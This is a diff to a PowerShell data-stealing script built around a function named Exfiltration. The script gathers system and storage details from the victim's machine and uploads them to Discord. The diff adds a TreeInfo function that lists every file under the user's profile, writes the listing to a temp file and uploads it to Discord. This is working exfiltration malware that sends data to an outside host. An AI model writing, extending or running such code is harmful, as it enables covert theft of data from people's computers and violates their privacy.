@@ -49,8 +49,12 @@ function Exfiltration {
     # Call SysInfo function
     SysInfo
 
-    #Call for StorageInfo
+    #Call StorageInfo
     StorageInfo
+
+    #Call TreeInfo
+    TreeInfo
+    
 }
 
 function version-av {
@@ -188,6 +192,18 @@ function StorageInfo {
     Upload-Discord -file $storageFilePath -text "Storage Information :"
 }
 
+# Function to get directory tree information
+function TreeInfo {
+    # Create or clear the Tree.txt file
+    $treeFilePath = "C:\Temp\Tree.txt"
+    Set-Content -Path $treeFilePath -Value $null
+
+    # Run the 'tree' command and redirect the output to Tree.txt
+    tree $Env:userprofile /a /f | Out-File -FilePath $treeFilePath -Encoding utf8
+
+    # Upload Tree.txt to Discord
+    Upload-Discord -file $treeFilePath -text "Directory Tree Information :"
+}
 
 # Function to delete the temporary directory
 function DelTempDir {
